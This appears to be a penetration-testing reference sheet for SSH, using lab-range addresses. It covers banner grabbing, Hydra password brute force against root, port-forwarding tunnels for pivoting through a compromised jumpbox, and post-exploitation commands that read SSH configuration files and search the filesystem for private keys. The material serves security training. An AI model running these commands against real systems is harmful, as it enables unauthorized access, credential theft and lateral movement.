# SSH (Secure Shell)
**Default Port:** 22 
**Key Insight:** Primary vector for remote access and pivoting. Weak configurations or exposed keys are critical vulnerabilities.
## 1. Banner Grabbing & Auditing
**Goal:** Identify the SSH version (OpenSSH, Dropbear, etc.) and weak encryption algorithms.
### Manual Banner Grab
```shell
# Description: Connect specifically to grab the version string.
# Syntax: nc -nv <IP> 22
nc -nv 10.129.2.15 22
```
### SSH Audit (Configuration Analysis)
**Install:** `pip3 install ssh-audit` 
**Docs:** [https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit)
```shell
# Description: Detailed analysis of supported algorithms, keys, and known vulnerabilities.
# Syntax: ssh-audit <IP>
# ⚠️ OPSEC: Low Noise. Standard handshake analysis.
ssh-audit 10.129.2.15
```
## 2. Authentication & Connection
**Goal:** Gain access using credentials or keys.
### Standard & Legacy Connections
```shell
# Standard Password Login
ssh root@10.129.2.15

# Force Password Auth
# Use this if the server offers a key, gets rejected, and doesn't ask for a password.
ssh -o PreferredAuthentications=password -v root@10.129.2.15

# Legacy Algorithms (Old Switches/Routers)
# Fixes "no matching key exchange method found" errors.
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc admin@10.129.2.15
```
### Private Key Login (Identity File)
**Critical:** SSH ignores keys with permissions reachable by other users (Group/World).
```shell
# 1. Fix Permissions (Read/Write for Owner ONLY)
chmod 600 id_rsa

# 2. Connect
# -i: Identity file
ssh -i id_rsa root@10.129.2.15
```
## 3. Brute Force (Hydra)
**Goal:** Guess weak passwords.
```shell
# Syntax: hydra -l <User> -P <Wordlist> ssh://<Target_IP>
# ⚠️ OPSEC: High Noise. Logs multiple failed login attempts.
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.2.15
```
## 4. Tunneling & Pivoting (Port Forwarding)
**Context:** You have compromised a "Jumpbox" (Target A) and want to reach a hidden "Database" (Target B) inside the internal network.
### Local Port Forwarding (-L)
**Scenario:** "I want to access the internal Database (172.16.1.5:3306) from my Attacker machine." 
**Direction:** Attacker Machine (Local) -> SSH Tunnel -> Target Service (Remote).
```shell
# Syntax: ssh -L <Local_Port>:<Internal_Target_IP>:<Target_Port> <User>@<Jumpbox_IP>
# Result: Connecting to localhost:3306 on YOUR machine forwards to 172.16.1.5:3306.
ssh -L 3306:172.16.1.5:3306 user@10.129.2.15
```
### Remote Port Forwarding (-R)
**Scenario:** "I want the compromised server to access a tool hosted on MY Attacker machine (e.g., `http://10.10.14.2:8000/linpeas.sh`)." 
**Direction:** Target Machine (Remote) -> SSH Tunnel -> Attacker Service (Local).
```shell
# Syntax: ssh -R <Remote_Port>:127.0.0.1:<Local_Port> <User>@<Jumpbox_IP>
# Result: The Target connects to 127.0.0.1:8000 (on ITSELF), which forwards to YOUR machine.
ssh -R 8000:127.0.0.1:8000 user@10.129.2.15
```
### Dynamic Port Forwarding (-D) [SOCKS Proxy]
**Scenario:** "I want to scan the ENTIRE internal network (172.16.1.0/24) using Nmap/Browser from my machine." 
**Direction:** Creates a SOCKS4/5 proxy on your machine.
```shell
# Syntax: ssh -D <Local_Proxy_Port> <User>@<Jumpbox_IP>
# Result: Opens port 9050 on YOUR machine. Configure Proxychains to use 127.0.0.1:9050.
ssh -D 9050 user@10.129.2.15

# Usage with Proxychains (e.g., Nmap)
proxychains nmap -sT -Pn -p 80 172.16.1.5
```
## 5. Post-Exploitation (Local Enumeration)
**Context:** You have a shell on the target.
### Critical Configuration Files
```shell
# Server Config (Look for PermitRootLogin, PasswordAuthentication)
# grep -v "#": Remove comments | sed: Remove empty lines
cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'

# Authorized Keys (Who can log in here?)
cat ~/.ssh/authorized_keys

# Known Hosts (Where has this user connected to?)
# Useful for finding other internal targets.
cat ~/.ssh/known_hosts
```
### Private Key Hunting (The Holy Grail)
**Goal:** Find keys to move laterally to other servers.
```shell
# Search for ID_RSA files
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```